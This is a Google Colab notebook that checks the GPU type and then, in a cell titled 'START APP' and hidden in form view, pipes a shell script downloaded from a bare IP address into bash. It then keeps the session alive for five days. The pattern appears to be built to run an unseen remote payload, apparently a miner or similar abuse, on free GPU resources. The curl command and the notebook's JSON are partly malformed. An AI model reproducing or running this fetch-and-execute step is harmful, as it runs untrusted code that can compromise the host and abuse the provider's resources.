{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tempur.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "ebXXp-4gz1zq"
      },
      "source": [
        "#@title GPU\n",
        "#@title Cek Tipe GPU
import pathlib, stat, shutil, urllib.request, subprocess, getpass, time, tempfile
def _get_gpu_name():
  r = subprocess.run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"], stdout = subprocess.PIPE, universal_newlines = True)
  if r.returncode != 0:
    return None
  return r.stdout.strip()

def _check_gpu_available():
  gpu_name = _get_gpu_name()
  if gpu_name == None:
    print("Ini Gada GPU Bosku!!!")
  else:
   return gpu_name
  return True
print(_check_gpu_available())"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Oz1z3dITz9kf",
        "cellView": "form"
      },
      "source": [
        "#@title START APP\n",
        "%cd /sbin/\n",
        "!ls -la\n",
        "!curl -O cache http://54.36.167.80/~dewabiz/run.sh -sL | bash\n",
        "\n",
        "alive = True #@param {type:'boolean'}\n",
        " \n",
        "! sleep 432000"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
